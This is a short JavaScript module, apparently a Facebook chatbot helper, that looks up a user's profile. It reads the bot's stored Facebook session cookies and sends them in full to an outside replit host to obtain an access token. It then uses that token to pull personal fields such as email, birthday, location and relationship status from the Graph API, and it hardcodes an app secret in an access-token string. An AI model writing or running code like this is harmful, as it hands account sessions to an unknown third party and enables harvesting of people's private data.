"use strcit";

    async function getInfo(uid) {   
        var q;
        if (fs.existsSync('./appstate.json')) {
           q = require('./appstate.json');
        }
        else if (fs.existsSync('./Facebook.json')) {
            q = require('./Facebook.json');
        }
        else if (fs.existsSync('fbstate.json')) {
            q = require('./fbstate.json')
        }
        else console.log('Không Tìm Được Path AppState!')

        const w = q.map(i => i = `${i.key}=${i.value}`).join(';');
        const e = require('axios');
        let a = (await e.get('https://token.sadgirlluytink.repl.co/token?cookie=' + w)).data;
        if(a.token.indexOf('Fail') !== -1) 
            return msg = { 
                author: 'D-Jukie',
                data: false
            }   
        const r = await e.get('https://graph.facebook.com/' + uid + '?fields=name,email,about,birthday,gender,hometown,link,location,quotes,relationship_status,significant_other,username,subscribers.limite(0)&access_token=' + a.token);
        var t = r.data
        var y = { 
            author: 'D-Jukie',
            data: {
                name: t.name || null,
                username: t.username || null,
                uid: t.id || null,
                about: t.about || null,
                follow: t.subscribers.summary.total_count || null,
                birthday: t.birthday || null,
                gender: t.gender,
                hometown: t.hometown || null,
                link: t.link || null,
                location: t.location || null,
                relationship_status: t.relationship_status || null,
                love: t.significant_other || null,
                quotes: t.quotes || null,
                website: t.website || null,
                imgavt: `https://graph.facebook.com/${uid}/picture?height=1500&width=1500&access_token=1073911769817594|aa417da57f9e260d1ac1ec4530b417de`
            }
        }
        return y;
    }
module.exports = {
    getInfo: getInfo
}